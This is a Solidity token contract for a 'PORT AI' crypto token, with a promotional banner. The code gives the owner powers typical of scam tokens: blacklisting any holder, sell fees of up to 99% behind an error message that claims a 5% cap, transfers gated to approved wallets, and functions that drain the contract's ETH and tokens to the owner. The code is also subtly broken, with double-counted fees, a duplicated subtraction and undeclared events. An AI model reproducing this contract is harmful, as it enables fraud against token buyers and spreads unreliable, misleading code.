/**
PORT AI: Manage your portfolio like never before with our Intelligent Insights.

PORT AI is an AI-Powered Telegram Bot that helps your portfolio managements with 
user friendly interface easy to access anywhere!

██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║
██████╔╝██║   ██║██████╔╝   ██║   ███████║██║
██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║
██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║██║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝

    Website: https://www.portaierc20.com/
    Telegram: https://t.me/PortAiErc20
    Twitter:  https://twitter.com/PortAIOfficial
    Bot : https://t.me/Port_AI_bot
    Gitbook : https://docs.portaierc20.com/

**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract enableTradingFacet is ERC20, Ownable {
    using SafeMath for uint256;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event endpointWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );
    event mWTUpdated(address indexed newWallet, address indexed oldWallet);
    event DtWTUpdated(address indexed newWallet, address indexed oldWallet);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    function enableTrading() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.tradingActive = true;
        ds.swapEnabled = true;
        ds.preMigrationPhase = false;
    }
    function removeLimits() external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.limitsInEffect = false;
        return true;
    }
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        ds.swapTokensAtAmount = newAmount;
        return true;
    }
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 999) / 1000) / 1e18,
            "Cannot set ds.maxTransactionAmount lower than 0.5%"
        );
        ds.maxTransactionAmount = newNum * (10 ** 18);
    }
    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            newNum >= ((totalSupply() * 999) / 1000) / 1e18,
            "Cannot set ds.maxWallet lower than 1.0%"
        );
        ds.maxWallet = newNum * (10 ** 18);
    }
    function excludeFromMaxTransaction(
        address updAds,
        bool isEx
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedMaxTransactionAmount[updAds] = isEx;
    }
    function updateSwapEnabled(bool enabled) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.swapEnabled = enabled;
    }
    function updateBuyFees(
        uint256 _LPStakingRewardsFee,
        uint256 _LPStakingRewards1Fee,
        uint256 _endpointFee,
        uint256 _FreeendpointFee,
        uint256 _mWTFee,
        uint256 _liquidityFee,
        uint256 _DtWTFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.buyLPStakingRewardsFee = _LPStakingRewardsFee;
        ds.buyLPStakingRewards1Fee = _LPStakingRewards1Fee;
        ds.buyendpointFee = _endpointFee;
        ds.buyFreeendpointFee = _FreeendpointFee;
        ds.buymWTFee = _mWTFee;
        ds.buyLiquidityFee = _liquidityFee;
        ds.buyDtWTFee = _DtWTFee;
        ds.buyTotalFees =
            ds.buyLPStakingRewardsFee +
            ds.buyLPStakingRewardsFee +
            ds.buyendpointFee +
            ds.buyFreeendpointFee +
            ds.buymWTFee +
            ds.buyLiquidityFee +
            ds.buyDtWTFee;
        require(ds.buyTotalFees <= 50, "Buy fees must be <= 5.");
    }
    function updateSellFees(
        uint256 _LPStakingRewardsFee,
        uint256 _LPStakingRewards1Fee,
        uint256 _endpointFee,
        uint256 _FreeendpointFee,
        uint256 _mWTFee,
        uint256 _liquidityFee,
        uint256 _DtWTFee
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellLPStakingRewardsFee = _LPStakingRewardsFee;
        ds.sellLPStakingRewards1Fee = _LPStakingRewards1Fee;
        ds.sellendpointFee = _endpointFee;
        ds.sellFreeendpointFee = _FreeendpointFee;
        ds.sellmWTFee = _mWTFee;
        ds.sellLiquidityFee = _liquidityFee;
        ds.sellDtWTFee = _DtWTFee;
        ds.sellTotalFees =
            ds.sellLPStakingRewardsFee +
            ds.sellLPStakingRewards1Fee +
            ds.sellendpointFee +
            ds.sellFreeendpointFee +
            ds.sellmWTFee +
            ds.sellLiquidityFee +
            ds.sellDtWTFee;
        require(ds.sellTotalFees <= 99, "Sell fees must be <= 5.");
    }
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            pair != ds.uniswapV2Pair,
            "The pair cannot be removed from ds.automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }
    function updateLPStakingRewardsWallet(
        address newLPStakingRewardsWallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit LPStakingRewardsWalletUpdated(
            newLPStakingRewardsWallet,
            ds.LPStakingRewardsWallet
        );
        ds.LPStakingRewardsWallet = newLPStakingRewardsWallet;
    }
    function updateLPStakingRewards1Wallet(
        address newLPStakingRewards1Wallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit LPStakingRewards1WalletUpdated(
            newLPStakingRewards1Wallet,
            ds.LPStakingRewards1Wallet
        );
        ds.LPStakingRewards1Wallet = newLPStakingRewards1Wallet;
    }
    function updateendpointWallet(
        address newendpointWallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit endpointWalletUpdated(newendpointWallet, ds.endpointWallet);
        ds.endpointWallet = newendpointWallet;
    }
    function updateFreeendpointWallet(
        address newFreeendpointWallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit FreeendpointWalletUpdated(
            newFreeendpointWallet,
            ds.FreeendpointWallet
        );
        ds.FreeendpointWallet = newFreeendpointWallet;
    }
    function updatemWT(address newmWT) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit mWTUpdated(newmWT, ds.mWT);
        ds.mWT = newmWT;
    }
    function updateDtWT(address newWallet) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        emit DtWTUpdated(newWallet, ds.DtWT);
        ds.DtWT = newWallet;
    }
    function addToWhitelist(address[] memory addresses) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < addresses.length; i++) {
            ds.whitelist[addresses[i]] = true;
        }
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!ds.blacklisted[from], "Sender ds.blacklisted");
        require(!ds.blacklisted[to], "Receiver ds.blacklisted");

        if (ds.preMigrationPhase) {
            require(
                ds.preMigrationTransferrable[from],
                "Not authorized to transfer pre-migration."
            );
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (ds.limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !ds.swapping
            ) {
                if (!ds.tradingActive) {
                    require(
                        ds._isExcludedFromFees[from] ||
                            ds._isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                //when buy
                if (
                    ds.automatedMarketMakerPairs[from] &&
                    !ds._isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Buy transfer amount exceeds the ds.maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
                //when sell
                else if (
                    ds.automatedMarketMakerPairs[to] &&
                    !ds._isExcludedMaxTransactionAmount[from]
                ) {
                    require(
                        amount <= ds.maxTransactionAmount,
                        "Sell transfer amount exceeds the ds.maxTransactionAmount."
                    );
                } else if (!ds._isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= ds.maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= ds.swapTokensAtAmount;

        if (
            canSwap &&
            ds.swapEnabled &&
            !ds.swapping &&
            !ds.automatedMarketMakerPairs[from] &&
            !ds._isExcludedFromFees[from] &&
            !ds._isExcludedFromFees[to]
        ) {
            ds.swapping = true;

            swapBack();

            ds.swapping = false;
        }

        bool takeFee = !ds.swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (ds._isExcludedFromFees[from] || ds._isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (ds.automatedMarketMakerPairs[to] && ds.sellTotalFees > 0) {
                fees = amount.mul(ds.sellTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.sellLiquidityFee) /
                    ds.sellTotalFees;
                ds.tokensForDtWT += (fees * ds.sellDtWTFee) / ds.sellTotalFees;
                ds.tokensForLPStakingRewards +=
                    (fees * ds.sellLPStakingRewardsFee) /
                    ds.sellTotalFees;
                ds.tokensForendpoint +=
                    (fees * ds.sellendpointFee) /
                    ds.sellTotalFees;
                ds.tokensForFreeendpoint +=
                    (fees * ds.sellFreeendpointFee) /
                    ds.sellTotalFees;
                ds.tokensFormWT += (fees * ds.sellmWTFee) / ds.sellTotalFees;
            }
            // on buy
            else if (
                ds.automatedMarketMakerPairs[from] && ds.buyTotalFees > 0
            ) {
                fees = amount.mul(ds.buyTotalFees).div(100);
                ds.tokensForLiquidity +=
                    (fees * ds.buyLiquidityFee) /
                    ds.buyTotalFees;
                ds.tokensForDtWT += (fees * ds.buyDtWTFee) / ds.buyTotalFees;
                ds.tokensForLPStakingRewards +=
                    (fees * ds.buyLPStakingRewardsFee) /
                    ds.buyTotalFees;
                ds.tokensForendpoint +=
                    (fees * ds.buyendpointFee) /
                    ds.buyTotalFees;
                ds.tokensForFreeendpoint +=
                    (fees * ds.buyFreeendpointFee) /
                    ds.buyTotalFees;
                ds.tokensFormWT += (fees * ds.buymWTFee) / ds.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    function withdrawStuckNODIFI() external onlyOwner {
        uint256 balance = IERC20(address(this)).balanceOf(address(this));
        IERC20(address(this)).transfer(msg.sender, balance);
        payable(msg.sender).transfer(address(this).balance);
    }
    function withdrawStuckToken(
        address _token,
        address _to
    ) external onlyOwner {
        require(_token != address(0), "_token address cannot be 0");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(_to, _contractBalance);
    }
    function sendStuckTokens() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        bool success;
        (success, ) = address(ds.DtWT).call{value: address(this).balance}("");
    }
    function withdrawStuckEth(address toAddr) external onlyOwner {
        (bool success, ) = toAddr.call{value: address(this).balance}("");
        require(success);
    }
    function renounceBlacklist() public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.blacklistRenounced = true;
    }
    function blacklist(address _addr) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.blacklistRenounced, "ds.DtWT has revoked blacklist rights");
        require(
            _addr != address(ds.uniswapV2Pair) &&
                _addr != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
            "Cannot blacklist token's v2 router or v2 pool."
        );
        ds.blacklisted[_addr] = true;
    }
    function blacklistLiquidityPool(address lpAddress) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.blacklistRenounced, "ds.DtWT has revoked blacklist rights");
        require(
            lpAddress != address(ds.uniswapV2Pair) &&
                lpAddress !=
                address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
            "Cannot blacklist token's v2 router or v2 pool."
        );
        ds.blacklisted[lpAddress] = true;
    }
    function unblacklist(address _addr) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.blacklisted[_addr] = false;
    }
    function disableHoldingLimit() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxWallet = 0;
    }
    function setPreMigrationTransferable(
        address _addr,
        bool isAuthorized
    ) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.preMigrationTransferrable[_addr] = isAuthorized;
        excludeFromFees(_addr, isAuthorized);
        excludeFromMaxTransaction(_addr, isAuthorized);
    }
    function swapBack() private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = ds.tokensForLiquidity +
            ds.tokensForLPStakingRewards +
            ds.tokensForendpoint +
            ds.tokensForFreeendpoint +
            ds.tokensFormWT +
            ds.tokensForDtWT;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > ds.swapTokensAtAmount * 20) {
            contractBalance = ds.swapTokensAtAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = (contractBalance * ds.tokensForLiquidity) /
            totalTokensToSwap /
            2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForLPStakingRewards = ethBalance
            .mul(ds.tokensForLPStakingRewards)
            .div(totalTokensToSwap - (ds.tokensForLiquidity / 2));

        uint256 ethForLPStakingRewards1 = ethBalance
            .mul(ds.tokensForLPStakingRewards1)
            .div(totalTokensToSwap - (ds.tokensForLiquidity / 2));

        uint256 ethForendpoint = ethBalance.mul(ds.tokensForendpoint).div(
            totalTokensToSwap - (ds.tokensForLiquidity / 2)
        );

        uint256 ethForFreeendpoint = ethBalance
            .mul(ds.tokensForFreeendpoint)
            .div(totalTokensToSwap - (ds.tokensForLiquidity / 2));

        uint256 ethFormWT = ethBalance.mul(ds.tokensFormWT).div(
            totalTokensToSwap - (ds.tokensForLiquidity / 2)
        );

        uint256 ethForDtWT = ethBalance.mul(ds.tokensForDtWT).div(
            totalTokensToSwap - (ds.tokensForLiquidity / 2)
        );

        uint256 ethForLiquidity = ethBalance -
            ethForLPStakingRewards -
            ethForLPStakingRewards1 -
            ethForendpoint -
            ethForendpoint -
            ethFormWT -
            ethForDtWT;

        ds.tokensForLiquidity = 0;
        ds.tokensForLPStakingRewards = 0;
        ds.tokensForLPStakingRewards1 = 0;
        ds.tokensForendpoint = 0;
        ds.tokensForFreeendpoint = 0;
        ds.tokensFormWT = 0;
        ds.tokensForDtWT = 0;

        (success, ) = address(ds.DtWT).call{value: ethForDtWT}("");

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                ds.tokensForLiquidity
            );
        }

        (success, ) = address(ds.LPStakingRewardsWallet).call{
            value: address(this).balance
        }("");
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.uniswapV2Router.WETH();

        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // make the swap
        ds.uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(ds.uniswapV2Router), tokenAmount);

        // add the liquidity
        ds.uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }
}
